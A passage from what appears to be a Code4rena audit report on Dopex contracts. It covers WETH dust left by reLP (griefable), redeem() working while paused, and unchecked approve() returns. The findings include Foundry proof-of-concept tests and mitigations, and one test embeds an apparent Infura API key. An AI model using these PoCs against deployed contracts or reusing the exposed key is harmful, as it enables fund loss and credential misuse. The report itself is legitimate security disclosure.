href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/300\">HChang26</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/254\">Yanchuan</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/70\">0x3b</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1993\">wintermute</a></em></p>\n<p><code>ReLPContract</code> contains logic that removes WETH-RDPX liquidity from Uniswap V2, swaps some amount WETH to RDPX and re-adds the liquidity.</p>\n<p>The calculation logic for the amount of tokens to swap is unreliable and sometimes reverts or leaves dust WETH in the reLP contract. WETH cannot be recovered unless another reLP operation is triggered. However, since reLP-ing is accessible to all users in the bonding logic in <code>RdpxV2Core</code>, the contract may be <strong>griefed on an ongoing basis, intentional or not.</strong></p>\n<p>The presence of excess WETH also means that the total value of the LP decreases abnormally after each reLP operation.</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following Foundry test demonstrates the vulnerability.</p>\n<ul>\n<li>Paste the code in a new file <code>PoC.t.sol</code> under <code>tests/</code></li>\n<li>Run the test with <code>forge test --match-test test_poc_relp_dust -vvv</code></li>\n</ul>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    // File: PoC.t.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // SPDX-License-Identifier: UNLICENSED</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    pragma solidity 0.8.19;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import &quot;forge-std/Test.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import &quot;forge-std/console.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import { Math } from &quot;@openzeppelin/contracts/utils/math/Math.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import {IERC20WithBurn} from &quot;contracts/interfaces/IERC20WithBurn.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import {MockToken} from &quot;contracts/mocks/MockToken.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import {MockRdpxEthPriceOracle} from &quot;contracts/mocks/MockRdpxEthPriceOracle.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import {ReLPContract} from &quot;contracts/reLP/ReLPContract.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import {RdpxReserve} from &quot;contracts/reserve/RdpxReserve.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import {IUniswapV2Factory} from &quot;contracts/uniswap_V2/IUniswapV2Factory.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import {IUniswapV2Router} from &quot;contracts/uniswap_V2/IUniswapV2Router.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    import {IUniswapV2Pair} from &quot;contracts/uniswap_V2/IUniswapV2Pair.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    contract MockUniV2Amo {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        function sync() external {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        function approve(address token, address to, uint256 amount) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IERC20WithBurn(token).approve(to, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    contract MockRdpxV2Core {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        function sync() external {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    contract PoC is Test {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        string internal constant ARBITRUM_RPC_URL =</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            &quot;https://arbitrum-mainnet.infura.io/v3/c088bb4e4cc643d5a0d3bb668a400685&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 internal constant BLOCK_NUM = 24023149; // 2022/09/13</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MockToken weth;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MockToken rdpx;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MockRdpxV2Core core;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        RdpxReserve reserve;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MockUniV2Amo amo;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        MockRdpxEthPriceOracle oracle;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IUniswapV2Factory factory;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IUniswapV2Router router;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IUniswapV2Pair pair;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ReLPContract re;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        function setUp() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 forkId = vm.createFork(ARBITRUM_RPC_URL, BLOCK_NUM);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            vm.selectFork(forkId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            weth = new MockToken(&quot;WETH&quot;, &quot;weth&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            rdpx = new MockToken(&quot;RDPX&quot;, &quot;rdpx&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            core = new MockRdpxV2Core();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            reserve = new RdpxReserve(address(rdpx));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            amo = new MockUniV2Amo();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            oracle = new MockRdpxEthPriceOracle();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            factory =</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                IUniswapV2Factory(0xc35DADB65012eC5796536bD9864eD8773aBc74C4);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            router =</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                IUniswapV2Router(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            pair = IUniswapV2Pair(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                factory.createPair(address(rdpx), address(weth))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            re = new ReLPContract();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            re.setAddresses(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(rdpx),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(weth),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(pair),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(core),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(reserve),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(amo),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(oracle),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(factory),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(router)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            re.setreLpFactor(1e8);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        function test_poc_relp_dust() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            weth.mint(address(this), 1000e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            rdpx.mint(address(this), 1000e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            rdpx.mint(address(reserve), 10e18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            weth.approve(address(router), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            rdpx.approve(address(router), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Initial liquidity in the pair (give to amo)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            router.addLiquidity(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(rdpx),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(weth),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                100e18,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                30e18,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                100e18,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                30e18,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                address(amo),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                block.timestamp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // pool is at 1 rdpx = 0.3 eth</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            oracle.updateRdpxPrice(0.3e8);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            amo.approve(address(pair), address(re), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            logInfo(&quot;Before relp&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            (uint112 tokenAReserve,,) = pair.getReserves();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            re.reLP(Math.sqrt(uint256(tokenAReserve)) * 250000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            logInfo(&quot;After relp&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        function logInfo(string memory label) private view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(label);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 lpBalanceAmo = pair.balanceOf(address(amo));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 lpBalanceRelp = pair.balanceOf(address(re));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 rdpxBalanceCore = rdpx.balanceOf(address(core));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256 wethBalanceRelp = weth.balanceOf(address(re));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;  lp:   amo=%s, relp=%s&quot;, lpBalanceAmo, lpBalanceRelp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;  rdpx: core=%s&quot;, rdpxBalanceCore);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log(&quot;  weth: relp=%s&quot;, wethBalanceRelp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            console.log();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n</details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Output</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Running 1 test for tests/ReLpDustPoc.t.sol:ReLpDustPoc</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [PASS] test_poc_relp_dust() (gas: 738137)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      Before relp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lp:   amo=54772255750516610345, relp=0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        rdpx: core=0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        weth: relp=0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      After relp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lp:   amo=54685393436705721902, relp=0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        rdpx: core=316227765999999999</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        weth: relp=67290285273869</span></span></code></pre>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p><a href=\"https://blog.alphaventuredao.io/onesideduniswap/\">Optimal One-sided Supply to Uniswap 🦄</a></p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>There is an <a href=\"https://blog.alphaventuredao.io/onesideduniswap/\">analytic formula</a> to provide one-sided liquidity to Uniswap V2 without leaving dust. This formula can be adapted to <code>ReLP</code>’s use-case such that <code>reLPFactor</code> specifies what part of the WETH make-up of the position will be swapped to RDPX according to the formula.</p>\n<p>Still, up to 2 wei of dust may be left after the operation, so the remainding RDPX <em>and</em> WETH should be sent to the core contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/153#issuecomment-1755948374\">Alex the Entreprenerd (Judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h2 id=\"m-17-the-rdpxv2core-contract-allows-anyone-to-call-redeem-tokens-even-if-the-contract-is-paused\" style=\"position:relative;\"><a href=\"#m-17-the-rdpxv2core-contract-allows-anyone-to-call-redeem-tokens-even-if-the-contract-is-paused\" aria-label=\"m 17 the rdpxv2core contract allows anyone to call redeem tokens even if the contract is paused permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/6\">[M-17] The RdpxV2Core contract allows anyone to call redeem tokens even if the contract is paused</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/6\">LowK</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2229\">HHK</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1900\">Tendency</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1683\">ItsNio</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1635\">ak1</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1235\">Inspecktor</a></em></p>\n<p>When the admin pauses the contract RdpxV3core locks anyone to use this contract such as a bond, bondWithDelegate, and withdraw. But a function redeem is still available to use.\nAny situations that occur like a hack accident or system are under maintenance then anyway, your smart contract is running to continue to get unexpected.</p>\n<h3 id=\"proof-of-concept-23\" style=\"position:relative;\"><a href=\"#proof-of-concept-23\" aria-label=\"proof of concept 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The code below does not call a function <code>whenNotPause()</code> to check whether this contract is paused or not.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function redeem(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 id,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address to</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) external returns (uint256 receiptTokenAmount) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Validate bond ID</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _validate(bonds[id].timestamp &gt; 0, 6);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Validate if bond has matured</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _validate(block.timestamp &gt; bonds[id].maturity, 7);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _validate(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      msg.sender == RdpxV2Bond(addresses.receiptTokenBonds).ownerOf(id),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      9</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Burn the bond token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Note requires an approval of the bond token to this contract</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    RdpxV2Bond(addresses.receiptTokenBonds).burn(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // transfer receipt tokens to user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    receiptTokenAmount = bonds[id].amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IERC20WithBurn(addresses.rdpxV2ReceiptToken).safeTransfer(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      receiptTokenAmount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit LogRedeem(to, receiptTokenAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>To reproduce this vulnerability, let’s modify a test called <code>testRedeem()</code> in a <code>/test/rdpxV2-core/Unit.t.sol</code>. After running the test, you will get everything passed. So it is proof of vulnerable</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function testRedeem() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpxV2Core.bond(1 * 1e18, 0, address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpxV2Core.pause(); // &lt;- add this line to test</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // test redeem after expiry</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpxV2Bond.approve(address(rdpxV2Core), 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpxV2Core.redeem(0, address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(rdpxV2Bond.balanceOf(address(this)), 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(rdpxV2ReceiptToken.balanceOf(address(1)), 25 * 1e16);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Adding the line <code>_whenNotPaused();</code> into the function <code>redeem()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/6#issuecomment-1734116507\">psytama (Dopex) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-18-return-values-of-approve-not-checked\" style=\"position:relative;\"><a href=\"#m-18-return-values-of-approve-not-checked\" aria-label=\"m 18 return values of approve not checked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[M-18] Return values of <code>approve()</code> not checked</h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3?permalink_comment_id=4779121#m01-return-values-of-approve-not-checked\">IllIllI</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/code423n4/3c6507b76ca940e11c287862cb4a1fd3\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>Not all <code>IERC20</code> implementations <code>revert()</code> when there’s a failure in <code>approve()</code>. The function signature has a <code>boolean</code> return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything.</p>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniV2LiquidityAmo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><em>GitHub</em>: <a 